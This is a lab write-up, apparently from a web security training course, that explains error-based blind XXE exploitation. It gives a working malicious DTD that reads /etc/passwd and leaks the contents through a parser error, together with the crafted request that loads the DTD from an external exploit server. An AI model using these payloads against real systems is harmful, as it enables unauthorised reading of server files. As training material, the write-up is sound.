## Lab 06: Exploiting Blind XXE to Retrieve Data via Error Messages

### Context
 
In some environments, making outbound HTTP requests from the server is blocked. The technique from Lab 05 would fail because the exfiltration callback cannot reach Collaborator. Error-based exfiltration is an alternative that does not require any outbound connectivity. Instead of sending data out, you force the parser to generate an error message that contains the data you want to read. The error appears in the application response.
 
### What I Did
 
On the exploit server I hosted a malicious DTD:
 
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
 
The DTD reads `/etc/passwd` into `%file`. It then constructs an entity that tries to open a file at a path that includes the file contents embedded in it. That path does not exist. The parser tries to open it anyway, fails, and generates an error message that includes the path it attempted, which contains the file contents.
 
Saved the DTD on the exploit server. Intercepted the stock check request and modified it to load the external DTD:
 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/error.dtd"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
 
Sent the request. The response contained a parser error message with the contents of `/etc/passwd` embedded in the error text where the invalid file path appeared.
 
### Why It Works
 
XML parsers often include the problematic value in their error output because it helps developers debug malformed DTDs. By constructing a path that is guaranteed to fail but contains the data we want to see, the error message becomes the exfiltration channel. No outbound connection required. The data comes back in the same HTTP response as an error rather than as a successful entity resolution.
 
